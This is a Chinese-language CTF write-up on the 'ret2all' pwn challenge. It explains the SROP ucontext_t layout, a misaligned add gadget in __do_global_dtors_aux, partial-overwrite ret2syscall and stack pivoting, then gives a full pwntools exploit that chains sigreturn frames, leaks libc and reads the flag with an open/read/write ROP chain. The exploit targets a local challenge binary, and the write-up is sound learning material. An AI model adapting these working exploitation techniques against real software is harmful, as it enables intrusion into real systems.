---
title: ret2all
date: '2025-11-11 15:24:40'
updated: '2025-12-20 11:26:06'
---
sigreturnframe之前一直没仔细看，直接用的pwntools里面的工具的

现在趁着复现ret2all的时候顺便再来看看源码：

ucontext_t是实际上syscall之后真正接在syscall语句后面的栈上的结构体

![](/images/c85b59592a5a6fb20f0a07806e3b27b9.png)

![](/images/acdae0aa06ae4f4a4387ff537134b928.png)

![](/images/a369e08345ec2c81685f2810bb773bd0.png)

实际上的栈应该长这样（幸好看了眼源码，这个ret2all的wp给的图也有一点错）

| syscall指令 | uc_flags |
| --- | --- |
| *uc_link | uc_stack.ss_sp |
| uc_stack.ss_size | uc_stack.ss_flags |
| r8 | r9 |
| r10 | r11 |
| r12 | r13 |
| r14 | r15 |
| rdi | rsi |
| rbp | rbx |
| rdx | rax |
| rcx | rsp |
| rip | eflags |
| cs/gs/fs/__pad0 | err |
| trapno | oldmask |
| cr2 | *fpstate |
| fpstate_word | __reserved1 |
| sigmask相关 | ... |


几个值得学习的点：

1. magic_gadget：

一般程序都会有__do_global_dtors_aux这个函数，而将`mov cs:completed_0, 1`指令的最后一位`01`拆开与下面的`pop rbp; ret`组合，就是`01 5D C3`，意思是`add dword ptr [rbp - 0x3d], ebx`，再加上后面的指令，`elfbase + 0x1252`的指令就是`add dword ptr [rbp - 0x3d], ebx; nop dword ptr [rax]; ret`

这个指令需要先控制ebx，然后可以将ebx中的数值加到`rbp - 0x3d`这个地方，可以用来控制libc偏移

因为栈上放着libc地址，加上偏移就可以用来获得我们需要的libc里面的gadget，而且还不需要泄漏libc基址

2. ret2syscall：__libc_start_call_main函数当中是有syscall的，而且跟main函数返回的地方很近，可以覆盖一个字节实现ret2syscall
3. 栈返回：可以让rsp-8的位置处于read的写入范围内（刚进入read函数时候会push自己的返回地址），从而让read覆盖自己的返回地址，实现执行流的劫持
4. 栈迁移：把rbp跟leave;ret当一对来布栈风水
5. 控制rax为15（sigreturn）：利用栈迁移错位一个字节让read在自己返回地址前第7个字节开始输入，加上8个字节的返回地址正好让rax=15
6. SROP：

`uc_flags`字段需要设置为0。或者一个可读地址，并且这个可读地址的末第3个bit不能为1，例如我之前选用的leave的末尾是2，即0010，从右往左数第3个数是0，则该地址是合法的

`cs/gs/fs`字段一般设置为0x33，主要是为了设置cs，说得准确点前两个字节需要是0x0033，后面的字节随便设置。cs为0x33代表此时程序是以64位运行的，0x22代表是32位，如果这里设置错误，那么程序会直接动不了。后面的gs和fs字段不是那么重要

`&fpstate`字段需要设置为0。或者一个可读地址，并且该地址满足栈对齐，并且该地址+0x18的位置的值取低32位值后再取高16位值要是0，因为`fpstate`是一个结构体，这个位置是结构体中的`mxcsr`字段，这是一个32位的字段，其高16位最好不能有值。可见该字段如果想取一个合法地址是比较困难的，所以能设置0就设置0

其他地方如果不严格要求寄存器的值的话也可以用来布置栈风水，节省payload空间

ret2all的exp：

```plain
from pwn import *

filename = './ret2all'

debug = 0
if debug:
    io = remote('0.0.0.0', 9999)
else:
    io = process(filename)

elf = ELF(filename)

context(arch = elf.arch, log_level = 'debug', os = 'linux')

def dbg():
    gdb.attach(io)

io.recvuntil('0x')
RBP = int(io.recv(12), 16)
io.recvuntil('0x')
RET = int(io.recv(12), 16)
elfbase = RET - 0x1871
success('elfbase =>> ' + hex(elfbase))

read = elfbase + 0x182F
read2 = elfbase + 0x1840
read3 = elfbase + 0x183B
leave = elfbase + 0x1852
add_rbp_3d_ebx = elfbase + 0x1252
rbp = add_rbp_3d_ebx + 1
ret = rbp + 1
# 远程的时候在每个send后加个sleep(0.1)
io.send(b'I love you I feel lonely' * 4 + p64(RBP) + p64(RET) + p64(RBP + 0x10) + p64(read) + p64(RBP - 0x10))

io.send(p64(0) * 7 + p64(RBP + 0xf0) + p64(read) + p64(leave) + p64(RBP + 0x100) + p64(leave) + p64(RBP - 0x18) + p64(leave) + p64(0) + p8(0xec))

io.send(b'I love you I feel lonely' * 4 + p64(RBP) + p64(RET) + p64(RBP + 0xf0) + p64(read))

#frame = SigreturnFrame()
#frame.rax = 0
#frame.rbx = 0x6edca
#frame.rdi = 0
#frame.rsi = RBP + 0x30
#frame.rdx = 0x200
#frame.rsp = RBP + 0x40
#frame.rbp = RBP + 0x65
#frame.rip = read2
io.send(b'A' * 8 + p64(0) + p64(RBP + 0x30) + p64(RBP + 0x65) + p64(0x6edca) + p64(0x200) + p64(0) + p64(0) + p64(RBP + 0x40) + p64(read2) + p64(0) + p64(0x33) + p64(RBP + 0x150 + 1) + p64(read) + p64(RBP + 0x20) + p64(leave))

io.send(b'A' * 7 + p64(rbp))

#frame = SigreturnFrame()
#frame.rax = 33
#frame.rdi = 1
#frame.rsi = 2
#frame.rdx = 0
#frame.rsp = RBP + 0x28
#frame.rbp = RBP + 0x68
#frame.rip = ret
io.send(p64(leave) + p64(add_rbp_3d_ebx) + p64(rbp) + p64(RBP + 0xa8 + 1) + p64(read) + p64(RBP + 0x20) + p64(leave) + p64(RBP + 0xd0) + p64(read) + p64(0) * 4 + p64(1) + p64(2) + p64(RBP + 0x68) + p64(0) + p64(0) + p64(33) + p64(0) + p64(RBP + 0x28) + p64(ret) + p64(0) + p64(0x33))

io.send(b'A' * 7 + p64(rbp))

#frame = SigreturnFrame()
#frame.rax = 1
#frame.rdi = 2
#frame.rsi = RBP + 0x28
#frame.rdx = 0x200
#frame.rsp = RBP + 0x28
#frame.rbp = RBP + 0xe8
#frame.rip = ret
io.send(p64(rbp) + p64(RBP + 0xd8 + 1) + p64(read) + p64(RBP + 0x20) + p64(leave) + p64(2) + p64(RBP + 0x28) + p64(RBP + 0xe8) + p64(0) + p64(0x200) + p64(1) + p64(0) + p64(RBP + 0x28) + p64(ret) + p64(0) + p64(0x33) + p64(read3))

io.recv()
io.send(b'A' * 7 + p64(rbp))

syscall = u64(io.recv(6).ljust(8, b'\0'))
libcbase = syscall - 0x98fb6
success('libcbase =>> ' + hex(libcbase))
rax = libcbase + 0xdd237
rdi = libcbase + 0x10f75b
rsi = libcbase + 0x110a4d
rbx = libcbase + 0x586e4
mov_rdx_rbx_pop_rbx_pop_r12_pop_rbp = libcbase + 0xb0133

#close(0)
#open('./flag', 0)
#read(0, RBP, 0x200)
#write(2, RBP, 0x200)
io.send(b'A' * 0xc0 + b'./flag\x00\x00' + p64(rax) + p64(3) + p64(rdi) + p64(0) + p64(syscall) + p64(rax) + p64(2) + p64(rdi) + p64(RBP + 0xe8) + p64(rsi) + p64(0) + p64(syscall) + p64(rax) + p64(0) + p64(rdi) + p64(0) + p64(rsi) + p64(RBP) + p64(syscall) + p64(rax) + p64(1) + p64(rdi) + p64(2) + p64(syscall))

io.interactive()
```

